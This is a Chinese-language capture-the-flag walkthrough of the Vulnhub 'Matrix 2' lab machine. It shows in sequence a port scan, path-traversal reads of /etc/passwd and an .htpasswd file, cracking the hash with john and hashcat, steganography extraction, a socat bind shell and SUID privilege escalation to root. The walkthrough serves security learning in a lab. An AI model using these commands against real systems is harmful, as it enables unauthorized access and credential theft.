[TOC]



# 参考链接

https://www.anquanke.com/post/id/173111#h3-4

# 一、发现主机

在kali中使用`netdiscover`发现主机

![1552880763431](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1552880763431.png)

如上图所示，在我的网络结构中，唯一多出来的ip是`192.168.217.135`，因此它就是本次我们的靶机ip。

接下来使用nmap检查一下开放的端口情况。

```shell
nmap -sS -sC -sV -v -O -p1-65535 192.168.217.135
```

扫描结果如下：

```shell
80/tcp    open  http               nginx 1.10.3
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.10.3
|_http-title: Welcome in Matrix v2 Neo
1337/tcp  open  ssl/http           nginx
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Welcome to Matrix 2
|_http-server-header: nginx
|_http-title: 401 Authorization Required
| ssl-cert: Subject: commonName=nginx-php-fastcgi
| Subject Alternative Name: DNS:nginx-php-fastcgi
| Issuer: commonName=nginx-php-fastcgi
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-12-07T14:14:44
| Not valid after:  2028-12-07T14:14:44
| MD5:   2b68 58e4 d8c3 ab44 a964 46f8 e91e 8a21
|_SHA-1: 8a3a 7fd9 b876 e704 ab06 fbd5 6693 c2a1 4bca aa90
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
12320/tcp open  ssl/unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 350
|     <?xml version="1.0" encoding="utf-8"?>
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xml:lang="en" lang="en">
|     <head>
|     <title>400 Bad Request</title>
|     </head>
|     <body>
|     Request
|     </body>
|     </html>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Content-Type: text/html
|     Content-Length: 5216
|     <?xml version="1.0" encoding="utf-8"?>
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xml:lang="en" lang="en">
|     <head>
|     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
|     <!--
|     ShellInABox - Make command line applications available as AJAX web applications
|     Copyright (C) 2008-2010 Markus Gutschke markus@shellinabox.com
|     This program is free software; you can redistribute it and/or modify
|     under the terms of the GNU General Public License version 2 as
|     published by the Free Software Foundation.
|     This program is distributed in the hope that it will be useful,
|     WITHOUT ANY WARRANTY; without even the implied warranty
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Length: 0
|_    Allow: GET, POST, OPTIONS
| ssl-cert: Subject: commonName=nginx-php-fastcgi
| Subject Alternative Name: DNS:nginx-php-fastcgi
| Issuer: commonName=nginx-php-fastcgi
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-12-07T14:14:44
| Not valid after:  2028-12-07T14:14:44
| MD5:   2b68 58e4 d8c3 ab44 a964 46f8 e91e 8a21
|_SHA-1: 8a3a 7fd9 b876 e704 ab06 fbd5 6693 c2a1 4bca aa90
|_ssl-date: TLS randomness does not represent time
12321/tcp open  ssl/warehouse-sss?
| ssl-cert: Subject: commonName=nginx-php-fastcgi
| Subject Alternative Name: DNS:nginx-php-fastcgi
| Issuer: commonName=nginx-php-fastcgi
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-12-07T14:14:44
| Not valid after:  2028-12-07T14:14:44
| MD5:   2b68 58e4 d8c3 ab44 a964 46f8 e91e 8a21
|_SHA-1: 8a3a 7fd9 b876 e704 ab06 fbd5 6693 c2a1 4bca aa90
|_ssl-date: TLS randomness does not represent time
12322/tcp open  ssl/http           nginx
|_hadoop-datanode-info: 
|_hadoop-jobtracker-info: 
|_hadoop-tasktracker-info: 
|_hbase-master-info: 
|_http-favicon: Unknown favicon MD5: AEE5D32B16C89DE02AF2F67F77D8C748
| http-methods: 
|_  Supported Methods: GET HEAD POST
| http-robots.txt: 1 disallowed entry 
|_file_view.php
|_http-server-header: nginx
|_http-title: Welcome in Matrix v2 Neo
| ssl-cert: Subject: commonName=nginx-php-fastcgi
| Subject Alternative Name: DNS:nginx-php-fastcgi
| Issuer: commonName=nginx-php-fastcgi
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-12-07T14:14:44
| Not valid after:  2028-12-07T14:14:44
| MD5:   2b68 58e4 d8c3 ab44 a964 46f8 e91e 8a21
|_SHA-1: 8a3a 7fd9 b876 e704 ab06 fbd5 6693 c2a1 4bca aa90
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
```

整体而言，开放端口的列表如下：

![1552881558324](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1552881558324.png)

打开页面查看内容：

http://192.168.217.135/

![1552894813097](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1552894813097.png)

https://192.168.217.135:1337/

![1552894839191](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1552894839191.png)

https://192.168.217.135:12320/

![1552894877826](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1552894877826.png)

https://192.168.217.135:12322/

![1552894928159](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1552894928159.png)

# 二、web目录扫描

扫描http://192.168.217.135/ 

![1552902998102](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1552902998102.png)

扫描https://192.168.217.135:12322/

![1552903021478](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1552903021478.png)

发现https://192.168.217.135:12322/中存在robots.txt文件，查看一下。

![1552903073525](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1552903073525.png)

发现一个文件`file_view.php`

# 三、任意文件读取利用



查看上述文件未发现任何内容，查看源代码发现注释内容

```php
<!-- Error file parameter missing..!!! -->
```

根据提示应该是需要一个file参数，怀疑存在文件读取，果断尝试一波

```php
https://192.168.217.135:12322/file_view.php
POST提交file=/../../../../../../../../etc/passwd
```

成功查看到passwd文件

![1552903232061](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1552903232061.png)

因为这个web应用是nginx的，因此尝试读取默认的nginx的配置文件

```php
https://192.168.217.135:12322/file_view.php
POST提交file=../../../../../../../../../etc/nginx/sites-avaliable/default
```

配置文件内容如下：

```php
server { listen 0.0.0.0:80; root /var/www/4cc3ss/; index index.html index.php; include /etc/nginx/include/php; } server { listen 1337 ssl; root /var/www/; index index.html index.php; auth_basic "Welcome to Matrix 2"; auth_basic_user_file /var/www/p4ss/.htpasswd; fastcgi_param HTTPS on; include /etc/nginx/include/ssl; include /etc/nginx/include/php; } 
```

![1552903487763](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1552903487763.png)

看到存在/var/www/p4ss/.htpasswd 文件，尝试查看

```php
https://192.168.217.135:12322/file_view.php
POST提交file=../../../../../../../../../var/www/p4ss/.htpasswd
```

发现了nginx的用户名和密码

```php
Tr1n17y:$apr1$7tu4e5pd$hwluCxFYqn/IHVFcQ2wER0
```

![1552903597541](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1552903597541.png)

分析一下上述密码

```shell
hashid
$apr1$7tu4e5pd$hwluCxFYqn/IHVFcQ2wER0

Analyzing '$apr1$7tu4e5pd$hwluCxFYqn/IHVFcQ2wER0'
[+] MD5(APR) 
[+] Apache MD5
```

```shell
hash-identifier
$apr1$7tu4e5pd$hwluCxFYqn/IHVFcQ2wER0

Possible Hashs:
[+]  MD5(APR)
```

确定加密类型，我们可以准备开始破解。可以拿john或hashcat进行破解

```shell
john /tmp/mima.txt --wordlist=/soft/password/10kpass.txt
```

![1552904263765](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1552904263765.png)

```shell
hashcat -a 0 -m 1600 mima.txt top3000.txt
```

```
$apr1$7tu4e5pd$hwluCxFYqn/IHVFcQ2wER0:admin
```

![1552904545290](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1552904545290.png)

现在我们拿到了密码，可以准备登陆nginx进行下一步利用

# 四、nginx利用

使用用户名密码登陆https://192.168.217.135:1337/

```shell
Tr1n17y:admin
```

登陆进入以后如图

![1552904686815](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1552904686815.png)

查看源代码，发现有一句注释

```php
<!--img src="h1dd3n.jpg"-->
```

查看图片

![1552904921873](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1552904921873.png)

未发现任何提示，下载下来尝试查看是否存在隐写。

```shell
steghide.exe --extract -sf h1dd3n.jpg
```

![1553691790149](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1553691790149.png)

根据这个输出，可以判断出来，这个图片肯定是存在隐写的了，但是要求输入密码，这个密码我们可以推测，当我们刚刚登陆进入nginx以后，首页中的红色字体有可能就是密码，也就是n30，我们尝试输入n30。

![1553691868989](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1553691868989.png)

成功的导出txt文件，其名称同样为n30，打开这个txt文件，只有一个字符串

```shell
P4$$w0rd
```

猜测它就是密码，既然有密码了，那么肯定有一个登陆的地方。

# 五、12320端口web端shell利用

这时候，我们可以回想起来，前期信息收集的时候，找到了一个12320端口打开是一个web端的shell，可以猜测那里进行登陆。

用root登陆会提示密码错误，那么说明不是root用户的。大胆猜测，既然文本命名为n30，那么是不是有这个用户呢。

尝试用n30登陆，登陆成功

![1553692255830](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1553692255830.png)

那么为了方便操作呢，我们反弹shell回来。这个环境里没有nc命令，但是有socat命令，我们用socat反弹

首先在web的shell中输入

```shell
socat TCP-LISTEN:2222,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
```

然后在本地输入

```shell

```

![1553692515943](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1553692515943.png)

进入普通用户了，那么我们下一步肯定就是提权了。

# 六、提权

首先让我们查看一下它的历史命令

```shell
cd /home/n30
ls -al
more .bash_history
```

![1553692710898](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1553692710898.png)

看到了么，有一条命令看上去就像是提权的

```shell
morpheus 'BEGIN {system("/bin/sh")}'
```

让我们查查文件的权限情况

```shell
find / -perm -u=s -type f 2>/dev/null
```

![1553692814686](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1553692814686.png)

如图，看到了么，/usr/bin/morpheus，是具有suid的，那么我们就执行一下上述命令看看效果。

```shell
morpheus 'BEGIN {system("/bin/sh")}'
```

![1553692884182](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1553692884182.png)

成功到手，root权限拿下。

查看flag

![1553692937000](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1553692937000.png)

当然，除此之外，其实应该还是有很多其他提权姿势的吧。